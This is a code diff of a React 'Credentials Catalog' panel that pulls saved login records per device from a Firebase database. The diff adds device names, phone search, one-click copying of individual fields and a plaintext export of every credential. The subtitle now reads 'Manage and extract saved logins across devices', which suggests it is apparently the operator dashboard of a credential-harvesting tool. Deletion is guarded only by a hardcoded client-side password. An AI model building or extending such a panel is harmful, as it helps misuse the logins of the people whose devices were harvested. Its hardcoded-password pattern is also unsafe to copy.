@@ -12,33 +12,44 @@ export default function CredentialsPanel({ data, deviceSerialMap, showToast, del
 
   const loginData = data.login || {};
   const devices = data.user_data || {};
+  const statusData = data.device_status || {};
 
-  let catalog = Object.keys(loginData).map(devId => {
-    const list = Object.entries(loginData[devId] || {}).map(([key, val]) => ({
-      key,
-      ...val,
-      _timestamp: val.timestamp || val.date || Date.now()
-    })).sort((a, b) => b._timestamp - a._timestamp);
+  let catalog = Object.keys(loginData).map((devId) => {
+    const list = Object.entries(loginData[devId] || {})
+      .map(([key, val]) => ({
+        key,
+        ...val,
+        _timestamp: val.timestamp || val.date || Date.now(),
+      }))
+      .sort((a, b) => b._timestamp - a._timestamp);
+
+    const dev = devices[devId] || {};
+    const status = statusData[devId] || {};
+    const modelName = status.device_name || dev.Device_info || dev.d_name || devId;
 
     return {
       deviceId: devId,
+      deviceName: modelName,
       serial: deviceSerialMap[devId] || 0,
-      deviceInfo: devices[devId] || {},
       credentials: list,
       count: list.length,
-      latestTimestamp: list[0]?._timestamp || 0
+      latestTimestamp: list[0]?._timestamp || 0,
     };
   }).sort((a, b) => b.latestTimestamp - a.latestTimestamp);
 
-  if (filterMode === "hasCreds") catalog = catalog.filter(c => c.count > 0);
-  if (filterMode === "noCreds") catalog = catalog.filter(c => c.count === 0);
-  if (selectedDevice) catalog = catalog.filter(c => c.deviceId === selectedDevice);
+  if (filterMode === "hasCreds") catalog = catalog.filter((c) => c.count > 0);
+  if (filterMode === "noCreds") catalog = catalog.filter((c) => c.count === 0);
+  if (selectedDevice) catalog = catalog.filter((c) => c.deviceId === selectedDevice);
 
-  if (search) {
+  if (search.trim()) {
     const q = search.toLowerCase();
-    catalog = catalog.filter(c => 
-      c.deviceId.toLowerCase().includes(q) || 
-      c.credentials.some(cr => Object.values(cr).some(val => String(val).toLowerCase().includes(q)))
+    catalog = catalog.filter(
+      (c) =>
+        c.deviceId.toLowerCase().includes(q) ||
+        c.deviceName.toLowerCase().includes(q) ||
+        c.credentials.some((cr) =>
+          Object.values(cr).some((val) => String(val).toLowerCase().includes(q))
+        )
     );
   }
 
@@ -46,8 +57,9 @@ export default function CredentialsPanel({ data, deviceSerialMap, showToast, del
   const paginated = catalog.slice((page - 1) * perPage, page * perPage);
 
   const deleteSingle = (devId, key) => {
-    const pwd = prompt("Enter Password:");
-    if (pwd !== "9999") return showToast("❌ Invalid Password", "error");
+    const pwd = prompt("Enter Admin Password:");
+    if (pwd !== "9090") return showToast("❌ Invalid Password", "error");
+    if (!confirm("Delete this credential record?")) return;
     remove(ref(db, `login/${devId}/${key}`)).then(() => showToast("Credential Deleted", "success"));
   };
 
@@ -57,13 +69,18 @@ export default function CredentialsPanel({ data, deviceSerialMap, showToast, del
       if (!k.startsWith("_") && k !== "key") str += `${k}: ${fields[k]}\n`;
     }
     navigator.clipboard.writeText(str);
-    showToast("📋 All credentials copied!", "success");
+    showToast("📋 All record credentials copied!", "success");
+  };
+
+  const copyValue = (val, label) => {
+    navigator.clipboard.writeText(String(val));
+    showToast(`📋 Copied ${label}: ${String(val).slice(0, 20)}`, "success");
   };
 
   const exportCreds = () => {
     let text = `=== CREDENTIALS EXPORT [${new Date().toLocaleString()}] ===\n\n`;
-    catalog.forEach(item => {
-      text += `📱 Device: ${item.deviceId} (S-${item.serial})\n`;
+    catalog.forEach((item) => {
+      text += `📱 Device: ${item.deviceName} (${item.deviceId}) | Serial: ${item.serial}\n`;
       item.credentials.forEach((c, idx) => {
         text += `   Record #${idx + 1}:\n`;
         Object.entries(c).forEach(([k, v]) => {
@@ -84,8 +101,10 @@ export default function CredentialsPanel({ data, deviceSerialMap, showToast, del
     <div className="panel active">
       <div className="panel-header">
         <div>
-          <h2><i className="fas fa-key" style={{ color: "var(--gold)" }}></i> Credentials Catalog</h2>
-          <p className="panel-sub">View and manage all saved credentials across devices</p>
+          <h2>
+            <i className="fas fa-key" style={{ color: "var(--gold)" }}></i> Credentials Catalog
+          </h2>
+          <p className="panel-sub">Manage and extract saved logins across devices</p>
         </div>
         <div className="panel-stats">
           <button className="btn-delete-all credential" onClick={deleteAllCredentials}>
@@ -94,63 +113,233 @@ export default function CredentialsPanel({ data, deviceSerialMap, showToast, del
         </div>
       </div>
 
-      <div className="credentials-catalog active">
-        <div className="catalog-toolbar">
-          <div className="toolbar-search">
-            <i className="fas fa-search"></i>
-            <input 
-              type="text" 
-              placeholder="Search by device, field, or value..." 
-              value={search}
-              onChange={(e) => { setSearch(e.target.value); setPage(1); }}
-            />
-          </div>
-          <button className={`toolbar-btn ${filterMode === "all" ? "active" : ""}`} onClick={() => setFilterMode("all")}>All</button>
-          <button className={`toolbar-btn ${filterMode === "hasCreds" ? "active" : ""}`} onClick={() => setFilterMode("hasCreds")}>With Creds</button>
-          <button className={`toolbar-btn ${filterMode === "noCreds" ? "active" : ""}`} onClick={() => setFilterMode("noCreds")}>No Creds</button>
-          <button className="toolbar-btn" onClick={exportCreds}><i className="fas fa-download"></i> Export</button>
+      <div className="catalog-toolbar" style={{ display: "flex", gap: 8, flexWrap: "wrap", marginBottom: 12 }}>
+        <div className="search-container" style={{ flex: 1, minWidth: 200, margin: 0 }}>
+          <i className="fas fa-search search-icon"></i>
+          <input
+            type="text"
+            placeholder="Search device, name, or phone..."
+            className="search-input"
+            value={search}
+            onChange={(e) => {
+              setSearch(e.target.value);
+              setPage(1);
+            }}
+          />
         </div>
+        <button
+          className={`filter-btn ${filterMode === "all" ? "active" : ""}`}
+          onClick={() => setFilterMode("all")}
+        >
+          All
+        </button>
+        <button
+          className={`filter-btn ${filterMode === "hasCreds" ? "active" : ""}`}
+          onClick={() => setFilterMode("hasCreds")}
+        >
+          With Creds
+        </button>
+        <button className="filter-btn" onClick={exportCreds}>
+          <i className="fas fa-download"></i> Export
+        </button>
+      </div>
 
-        <div className="device-filter-tabs">
-          <button className={`filter-tab ${!selectedDevice ? "active" : ""}`} onClick={() => setSelectedDevice(null)}>All Devices</button>
-          {catalog.filter(c => c.count > 0).slice(0, 5).map(c => (
-            <button 
-              key={c.deviceId} 
-              className={`filter-tab ${selectedDevice === c.deviceId ? "active" : ""}`}
+      <div
+        className="device-filter-tabs"
+        style={{
+          display: "flex",
+          gap: 6,
+          overflowX: "auto",
+          paddingBottom: 8,
+          marginBottom: 14,
+        }}
+      >
+        <button
+          className={`filter-btn ${!selectedDevice ? "active" : ""}`}
+          onClick={() => setSelectedDevice(null)}
+          style={{ whiteSpace: "nowrap" }}
+        >
+          All Devices
+        </button>
+        {catalog
+          .filter((c) => c.count > 0)
+          .slice(0, 8)
+          .map((c) => (
+            <button
+              key={c.deviceId}
+              className={`filter-btn ${selectedDevice === c.deviceId ? "active" : ""}`}
               onClick={() => setSelectedDevice(c.deviceId)}
+              style={{ whiteSpace: "nowrap" }}
             >
-              📱 {c.deviceId.slice(0, 10)} <span className="tab-count">{c.count}</span>
+              📱 {c.deviceId.slice(0, 8)}... ({c.count})
             </button>
           ))}
-        </div>
+      </div>
 
-        <div className="creds-grid">
-          {paginated.map(item => (
-            <div key={item.deviceId} className="cred-card">
-              <div className="cred-card-header">
-                <div className="device-name-tag">
-                  <span className="dev-name">{item.deviceId}</span>
-                  {item.serial > 0 && <span className="dev-serial">S-{item.serial}</span>}
+      {paginated.length === 0 ? (
+        <div className="empty-luxury">
+          <i className="fas fa-key empty-icon"></i>
+          No credentials found.
+        </div>
+      ) : (
+        <div className="creds-grid" style={{ display: "flex", flexDirection: "column", gap: 14 }}>
+          {paginated.map((item) => (
+            <div
+              key={item.deviceId}
+              className="cred-card"
+              style={{
+                background: "linear-gradient(145deg, #181d2a, #111520)",
+                border: "1px solid var(--border-color)",
+                borderRadius: "var(--radius)",
+                padding: "16px",
+                boxShadow: "0 4px 18px rgba(0,0,0,0.35)",
+              }}
+            >
+              <div
+                style={{
+                  display: "flex",
+                  justifyContent: "space-between",
+                  alignItems: "center",
+                  flexWrap: "wrap",
+                  gap: 8,
+                  borderBottom: "1px solid rgba(255,255,255,0.06)",
+                  paddingBottom: 10,
+                  marginBottom: 12,
+                }}
+              >
+                <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+                  <span
+                    style={{
+                      background: "rgba(212, 175, 55, 0.15)",
+                      color: "var(--gold)",
+                      padding: "3px 10px",
+                      borderRadius: 14,
+                      fontSize: 11,
+                      fontWeight: 700,
+                      border: "1px solid rgba(212, 175, 55, 0.3)",
+                    }}
+                  >
+                    📱 {item.deviceId.slice(0, 14)}...
+                  </span>
+                  {item.serial > 0 && (
+                    <span className="serial-badge-premium" style={{ fontSize: 10, padding: "2px 8px" }}>
+                      S-{item.serial}
+                    </span>
+                  )}
+                  <span style={{ fontSize: 12, color: "var(--text-muted)" }}>({item.deviceName})</span>
                 </div>
-                <span className="cred-count-badge"><i className="fas fa-key"></i> {item.count}</span>
+
+                <span
+                  style={{
+                    background: "rgba(139, 92, 246, 0.15)",
+                    color: "var(--purple)",
+                    padding: "3px 10px",
+                    borderRadius: 14,
+                    fontSize: 11,
+                    fontWeight: 700,
+                    border: "1px solid rgba(139, 92, 246, 0.3)",
+                  }}
+                >
+                  <i className="fas fa-key"></i> {item.count} Saved
+                </span>
               </div>
-              <div className="cred-card-body">
+
+              <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
                 {item.credentials.map((cred, idx) => (
-                  <div key={cred.key || idx} className="cred-item">
-                    <div className="cred-item-header">
-                      <span className="record-num">#{idx + 1}</span>
-                      <div className="cred-actions">
-                        <button onClick={() => copyCred(cred)}><i className="fas fa-copy"></i></button>
-                        <button className="danger" onClick={() => deleteSingle(item.deviceId, cred.key)}><i className="fas fa-trash"></i></button>
+                  <div
+                    key={cred.key || idx}
+                    style={{
+                      background: "rgba(10, 14, 22, 0.6)",
+                      border: "1px solid var(--border-color)",
+                      borderRadius: "var(--radius-sm)",
+                      padding: "12px 14px",
+                      borderLeft: idx === 0 ? "3px solid var(--green)" : "3px solid var(--gold)",
+                    }}
+                  >
+                    <div
+                      style={{
+                        display: "flex",
+                        justifyContent: "space-between",
+                        alignItems: "center",
+                        marginBottom: 8,
+                        paddingBottom: 6,
+                        borderBottom: "1px solid rgba(255,255,255,0.04)",
+                      }}
+                    >
+                      <span style={{ fontSize: 11, fontWeight: 700, color: "var(--gold-light)" }}>
+                        #{idx + 1} Record {idx === 0 && <span style={{ color: "var(--green)", fontSize: 10 }}>[LATEST]</span>}
+                      </span>
+                      <div style={{ display: "flex", gap: 6 }}>
+                        <button
+                          className="btn-sm"
+                          onClick={() => copyCred(cred)}
+                          style={{
+                            background: "rgba(212, 175, 55, 0.15)",
+                            color: "var(--gold)",
+                            padding: "3px 8px",
+                            borderRadius: 6,
+                            cursor: "pointer",
+                            display: "flex",
+                            alignItems: "center",
+                            gap: 4
+                          }}
+                          title="Copy Full Record"
+                        >
+                          <i className="fas fa-copy"></i> Copy All
+                        </button>
+                        <button
+                          className="btn-sm"
+                          onClick={() => deleteSingle(item.deviceId, cred.key)}
+                          style={{
+                            background: "rgba(239, 68, 68, 0.15)",
+                            color: "var(--red)",
+                            padding: "3px 8px",
+                            borderRadius: 6,
+                            cursor: "pointer"
+                          }}
+                          title="Delete Record"
+                        >
+                          <i className="fas fa-trash"></i>
+                        </button>
                       </div>
                     </div>
-                    <div className="cred-fields">
-                      {Object.entries(cred).filter(([k]) => !k.startsWith("_") && k !== "key").map(([k, v]) => (
-                        <div key={k} className="cred-field">
-                          <span className="field-label">{k}</span>
-                          <span className="field-value">{String(v)}</span>
-                        </div>
-                      ))}
+
+                    <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
+                      {Object.entries(cred)
+                        .filter(([k]) => !k.startsWith("_") && k !== "key")
+                        .map(([k, v]) => (
+                          <div
+                            key={k}
+                            style={{
+                              display: "flex",
+                              justifyContent: "space-between",
+                              alignItems: "center",
+                              fontSize: 12,
+                              padding: "4px 0",
+                              borderBottom: "1px dashed rgba(255,255,255,0.05)",
+                            }}
+                          >
+                            <span style={{ color: "var(--text-muted)", fontWeight: 500 }}>{k}</span>
+                            <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
+                              <span style={{ color: "var(--text-primary)", fontWeight: 600 }}>{String(v)}</span>
+                              <button
+                                onClick={() => copyValue(v, k)}
+                                style={{
+                                  background: "rgba(212, 175, 55, 0.1)",
+                                  border: "1px solid rgba(212, 175, 55, 0.2)",
+                                  color: "var(--gold)",
+                                  padding: "2px 6px",
+                                  borderRadius: 4,
+                                  cursor: "pointer",
+                                  fontSize: 11,
+                                }}
+                                title={`Copy ${k}`}
+                              >
+                                <i className="fas fa-copy"></i>
+                              </button>
+                            </div>
+                          </div>
+                        ))}
                     </div>
                   </div>
                 ))}
@@ -158,13 +347,37 @@ export default function CredentialsPanel({ data, deviceSerialMap, showToast, del
             </div>
           ))}
         </div>
+      )}
 
-        <div className="catalog-pagination">
-          <button onClick={() => setPage(p => Math.max(1, p - 1))} disabled={page <= 1}><i className="fas fa-chevron-left"></i></button>
-          <span>Page {page} of {totalPages}</span>
-          <button onClick={() => setPage(p => Math.min(totalPages, p + 1))} disabled={page >= totalPages}><i className="fas fa-chevron-right"></i></button>
+      {totalPages > 1 && (
+        <div
+          style={{
+            display: "flex",
+            justifyContent: "center",
+            alignItems: "center",
+            gap: 12,
+            marginTop: 18,
+          }}
+        >
+          <button
+            className="filter-btn"
+            disabled={page <= 1}
+            onClick={() => setPage((p) => Math.max(1, p - 1))}
+          >
+            Previous
+          </button>
+          <span style={{ fontSize: 12, color: "var(--text-muted)" }}>
+            Page {page} of {totalPages}
+          </span>
+          <button
+            className="filter-btn"
+            disabled={page >= totalPages}
+            onClick={() => setPage((p) => Math.min(totalPages, p + 1))}
+          >
+            Next
+          </button>
         </div>
-      </div>
+      )}
     </div>
   );
 }
